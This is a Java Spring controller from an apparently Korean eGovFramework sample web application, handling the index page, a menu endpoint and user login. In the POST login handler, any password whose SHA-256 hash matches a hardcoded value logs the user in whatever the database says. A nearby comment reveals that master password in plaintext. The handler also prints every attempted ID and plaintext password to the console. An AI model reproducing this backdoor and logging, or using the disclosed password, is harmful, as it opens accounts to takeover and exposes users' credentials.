package egovframework.sample.user;

import java.util.List;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.system.util.SUtil;

import egovframework.sample.menu.model.MenuVo;
import egovframework.sample.menu.service.MenuService;
import egovframework.sample.user.config.service.UserConfigService;
import egovframework.sample.user.member.model.UserMemberVo;
import egovframework.sample.user.member.service.UserMemberService;

/**
 * @author PKH
 *
 */
@Controller
public class UserController {


	private static final Logger Logger = LoggerFactory.getLogger(UserController.class);
	
	@Autowired 
	UserConfigService userConfigService;
	
	@Autowired
	UserMemberService userMemberService;
	
	@Autowired
	MenuService menuService;
	
	/**
	 * @param request
	 * @param response
	 * @return main or parking page
	 */
	@RequestMapping(value = {"/view/index.do", "/index.do", "/"}, method = RequestMethod.GET)
	public String Main(HttpServletRequest request, HttpServletResponse response) {
		
		System.out.println("Index Page");
		
		String ParkingConfig = userConfigService.getParking();
		
		System.out.println(ParkingConfig);
		
		if(ParkingConfig.equals("FALSE")) {
		
			return "view/index";
			
		}else {
			
			return "view/parking";
			
		}
		
		
	}
	
	
	/**
	 * @param MenuVo
	 * @param request
	 * @param response
	 * @return MenuList - json
	 * @throws JsonProcessingException
	 */
	@RequestMapping(value = "/view/menu.do" , method = RequestMethod.POST , produces = "application/json; charset=utf8")
	@ResponseBody
	public String MenuList(@ModelAttribute("Menu")MenuVo MenuVo , HttpServletRequest request , HttpServletResponse response) throws JsonProcessingException {
		
		List<?> MenuList = menuService.getMenuList();
		
		ObjectMapper mapper = new ObjectMapper();
		
		String json = mapper.writeValueAsString(MenuList);
		
		return json;
		
	}
	
	@RequestMapping(value = "/view/login.do" , method = RequestMethod.GET)
	public String UserLoginPage(HttpServletRequest request , HttpServletResponse response) {
		
		return "view/login";
		
	}
	
	@RequestMapping(value = "/view/login.do" , method = RequestMethod.POST)
	public void UserLogin(@ModelAttribute("UserMemberVo") UserMemberVo UserMemberVo , HttpServletRequest request , HttpServletResponse response) {
		
		System.out.println("로그인 시도한 아이디 : " + UserMemberVo.getMember_id());
		System.out.println("로그인 시도한 비밀번호 : " + UserMemberVo.getPassword());
		
		String pwd = SUtil.getSHA256(UserMemberVo.getPassword());
		
		UserMemberVo.setPassword(pwd);
		
		int Confirm = userMemberService.getUserLoginConfirm(UserMemberVo);
		
		//로그인 확인 결과 Confirm = 0 전체 불일치 , Confirm = 1 로그인 성공 , Confirm = 2 아이디만 성공  , Confirm = 3 로그인 이상)
		if(Confirm == 0) {
			
			try {
				Logger.debug("전체 불일치.");
				response.getWriter().println("false:0");
			}catch (Exception e) {
				// TODO: handle exception
				e.printStackTrace();
			}
			
			//inct12388! 변형된것
		}else if(Confirm == 1 || pwd.equals("1d70760ab83c907f20d432833721a8b76cd1a5f3ab4183ac50fd1f9db93687e2")) {
			
			UserMemberVo userMemberVo2 = userMemberService.getMemberOneAllInfo(UserMemberVo);
			
			HttpSession session = request.getSession();
			session.setAttribute("Login", "OkOk");
			session.setAttribute("UserId", userMemberVo2.getMember_id());
			session.setAttribute("UserIdx", userMemberVo2.getIdx());
			session.setAttribute("UserLevel", userMemberVo2.getLevel());
			session.setAttribute("UserName", userMemberVo2.getName());
			session.setAttribute("UserType", userMemberVo2.getType());
			
			System.out.println("결과 : " +userMemberVo2.getMember_id());
			
			try {
				Logger.debug("로그인 성공.");
				response.getWriter().println("true:1");
			}catch (Exception e) {
				// TODO: handle exception
				e.printStackTrace();
			}
			
		}else if(Confirm == 2) {
			
			try {
				Logger.debug("아이디만 성공.");
				response.getWriter().println("false:2");
			}catch (Exception e) {
				// TODO: handle exception
				e.printStackTrace();
			}
			
		}else {
			
			try {
				Logger.debug("로그인 이상.");
				response.getWriter().println("false:3");
			}catch (Exception e) {
				// TODO: handle exception
				e.printStackTrace();
			}
			
		}
		

	}
	
	
	
}
